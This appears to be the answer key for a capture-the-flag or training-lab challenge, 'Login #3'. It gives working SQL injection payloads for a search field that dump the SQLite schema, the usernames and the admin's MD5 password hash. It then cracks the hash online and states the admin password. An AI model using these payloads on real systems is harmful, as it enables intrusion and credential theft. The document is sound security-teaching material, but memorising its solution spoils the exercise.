## Login #3 Answer
Sources: https://www.sqlite.org/schematab.html
Admin password = Tr0ub4dor&3
### Instructions:
1. Find the tables made in the sqlite db using the following command in the search bar on `/search`:
```
y" UNION SELECT sql FROM sqlite_schema; --
```
2. Find all usernames in the members database by running
```
y" UNION SELECT username FROM members WHERE True; -- 
```
3. Find the admin's password
```
y" UNION SELECT hashed_password FROM members where username = "admin"; -- 
```
4. Reverse the md5 hash online using [this link](https://md5.gromweb.com/?md5=4ece57a61323b52ccffdbef021956754)
5. Enter "admin" in the username field and "Tr0ub4dor&3" in the password field at `/` 